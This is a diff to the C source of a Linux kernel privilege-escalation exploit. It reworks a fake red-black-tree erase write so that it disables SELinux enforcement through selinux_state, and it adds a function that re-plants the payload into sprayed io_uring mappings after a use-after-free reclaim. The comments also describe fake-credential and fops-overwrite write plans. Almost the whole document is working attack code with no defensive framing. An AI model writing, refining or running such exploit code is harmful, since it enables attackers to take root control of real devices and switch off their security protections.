@@ -1266,7 +1266,14 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
           fake_right = payload_base + FAKE_CRED_OFF;
           pselect_custom_value = fake_right;
         } else if (pselect_custom_write == WRITE_MODE_CRED_SELINUX) {
-          /* Write 7 plan 0: 8-byte ZERO at selinux_state.
+          /* Write 7 plan 0.  On V643 the default is a non-NULL child whose
+           * kernel-pointer bytes write enforcing=0, checkreqprot=0 and keep
+           * initialized non-zero.  The child/collateral target is confined
+           * to non_irq_wake_reason by the arming checks in main.c.  A zero
+           * value retains the historical Sabrina red-leaf store, but that
+           * also clears initialized and is no longer the TCL default.
+           *
+           * Historical 8-byte ZERO at selinux_state:
            * rb_erase Case 1 with child == NULL stores NULL into
            * parent->rb_right == TARGET and then sets
            * rebalance = __rb_is_black(pc) ? parent : NULL: with the
@@ -1283,11 +1290,11 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
            * avc_denied() never returns -EACCES (enforcing=0) and
            * security_compute_av() short-circuits to allowed=0xffffffff
            * when !initialized - full permissive, both gates at once.
-           * The value MUST stay 0: any nonzero VALUE would be written to
-           * *TARGET as a pointer (two-store Case) whose low byte is
-           * nonzero - enforcing would stay set. */
-          fake_right = 0;
-          pselect_custom_value = 0;
+           * An arbitrary nonzero VALUE is unsafe.  The V643 preserving
+           * route is the narrow exception: its validated, aligned kernel
+           * pointer has low bytes 00,00,nonzero and its child store is
+           * confined to the diagnostic wake-reason buffer. */
+          fake_right = pselect_custom_value;
         } else if (pselect_custom_write == 5 && !pselect_custom_target) {
           /* Self-test: write page+SELFTEST_VALUE into page+SELFTEST_OFF.
            * Nothing outside the spray page is touched. */
@@ -1324,12 +1331,13 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     binwrite_target = payload_base + FOPS_OFF + 0x700;
   }
 
-  /* pc carries the COLOR BIT for the erase victim: the cred plans use
+  /* pc carries the COLOR BIT for the erase victim: the cred plans and the
+   * V643 preserving SELinux store use
    * pc|1 (RB_BLACK) - their child != NULL keeps rebalance NULL. The
    * mode-7 ZERO write has child == NULL, so its pc must be RED
    * (bit0 clear) or __rb_erase_color would walk the fake parent. */
   uintptr_t write_pc = fake_parent;
-  if (pselect_custom_write != WRITE_MODE_CRED_SELINUX)
+  if (pselect_custom_write != WRITE_MODE_CRED_SELINUX || fake_right != 0)
     write_pc = fake_parent | 1;
   uintptr_t write_right = fake_right;
   uintptr_t write_left = fake_left;
@@ -1476,6 +1484,24 @@ static void payload_into_mapping(void *map, size_t sz) {
     memset((uint8_t *)map + off, 0, MM_SLAB_SIZE);
     memcpy((uint8_t *)map + off, skb_buf, copy_len);
   }
+}
+
+/* Retarget a page after capture but before the PI route fires.  No task or
+ * credential references the payload yet, so replacing the complete template
+ * is safe.  This lets the TCL flow create and perf-identify its victim only
+ * after the fragile mm_struct reclaim has completed. */
+int tcl_refresh_captured_page(uintptr_t base, int payload_mode) {
+  if (!base || uring_count <= 0) return 0;
+  if (!prepare_skb_payload(base, payload_mode)) return 0;
+  int refreshed = 0;
+  for (int i = 0; i < uring_count && i < URING_MAX; i++) {
+    if (!uring_maps[i] || uring_maps[i] == MAP_FAILED) continue;
+    size_t sz = uring_mapsz[i] ? uring_mapsz[i] : MM_SLAB_SIZE;
+    payload_into_mapping(uring_maps[i], sz);
+    refreshed++;
+  }
+  atomic_thread_fence(memory_order_seq_cst);
+  return refreshed > 0;
 }
 
 /* One zero-window reclaim attempt. io_uring_setup(entries):
